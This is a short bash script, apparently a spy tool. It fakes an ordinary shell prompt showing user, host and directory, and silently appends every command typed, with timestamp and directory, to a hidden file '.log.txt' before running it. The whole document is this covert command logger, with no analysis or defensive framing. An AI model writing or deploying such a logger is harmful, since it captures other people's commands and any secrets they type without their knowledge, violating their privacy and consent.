touch .log.txt
spyfunc(){
echo -n "\033[32m\033[1m$(whoami)@$(hostname)""\033[37m:""\033[34m$(pwd)""\033[37m\033[0m$ "; ACT=$(head -1)
echo $(date):$(pwd) - $ACT >> .log.txt
END=$($ACT)
if [ "$END" = "" ]; then
echo -n ""
else 
echo $END
fi
if [ "$ACT" = "exit" ]; then
exit
fi
}
while [ 1 ]
do
spyfunc
done
